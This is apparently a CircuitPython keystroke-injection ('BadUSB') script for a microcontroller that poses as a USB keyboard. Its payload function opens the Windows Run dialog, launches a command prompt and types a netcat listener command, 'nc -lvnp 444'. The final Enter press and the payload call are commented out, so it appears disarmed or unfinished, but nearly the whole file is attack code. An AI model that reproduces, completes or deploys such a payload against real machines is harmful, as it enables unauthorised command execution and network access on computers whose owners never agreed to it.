import time
import usb_hid

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode


time.sleep(3)

def run_payload():

    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)

    kbd.press(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.2)
    kbd.release_all()

    layout.write("cmd")
    kbd.press(Keycode.ENTER)
    time.sleep(0.5)

    layout.write("nc -lvnp 444") #script
    time.sleep(0.3)

    #kbd.press(Keycode.ENTER)
    kbd.release_all()


#run_payload()

while True:
    time.sleep(1)